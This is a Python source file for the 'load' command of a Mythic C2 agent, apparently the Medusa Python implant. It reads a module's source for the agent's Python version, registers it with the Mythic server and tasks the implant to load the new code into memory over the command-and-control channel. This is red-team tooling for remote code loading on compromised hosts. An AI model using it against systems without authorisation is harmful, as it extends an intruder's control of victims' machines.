from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json, base64, os

class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.ChooseOne,
                description="Command to load into the agent",
                default_value=[], 
                dynamic_query_function=self.get_commands
            ),
        ]

    async def get_commands(self, callback: dict) -> [str]:
        resp = await MythicRPC().execute("get_commands", callback_id=callback["id"])
        if resp.status == MythicRPCStatus.Success:
            return [ cmd["cmd"] for cmd in resp.response if callback["build_parameters"]["python_version"] in cmd["attributes"]["supported_python_versions"]]
        else:
            return []

    async def parse_arguments(self):
        if self.command_line[0] != "{":
            self.add_arg("command", self.command_line)
        else:
            self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load"
    description = "This loads new functions into memory via the C2 channel."
    version = 1
    author = "@ajpc500"
    parameters = []
    attackmapping = ["T1030", "T1129"]
    argument_class = LoadArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 2.7", "Python 3.8"],
        supported_os=[SupportedOS.MacOS, SupportedOS.Windows, SupportedOS.Linux ],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        cmd_code = ""        
        cmd = task.args.get_arg("command")
        py_ver = task.callback.build_parameters['python_version']
        
        py_suffix = ".py2" if py_ver == "Python 2.7" else ".py3"

        path = ""
        for func in os.listdir(self.agent_code_path):
            if (func.endswith(py_suffix) or func.endswith(".py")) and cmd == func.split(".")[0]:
                path = func
                break
        
        try:
            code_path = self.agent_code_path / "{}".format(path)
            cmd_code = open(code_path, "r").read() + "\n"
        except Exception as e:
            raise Exception("Failed to find code for '{}'".format(cmd))

        resp = await MythicRPC().execute("create_file", task_id=task.id,
            file=base64.b64encode(cmd_code.encode()).decode(),
            delete_after_fetch=True,
        )
        if resp.status == MythicStatus.Success:
            task.args.add_arg("file_id", resp.response["agent_file_id"])
            task.args.add_arg("command", cmd)
        else:
            raise Exception("Failed to register file: " + resp.error)
        return task


    async def process_response(self, response: AgentResponse):
        pass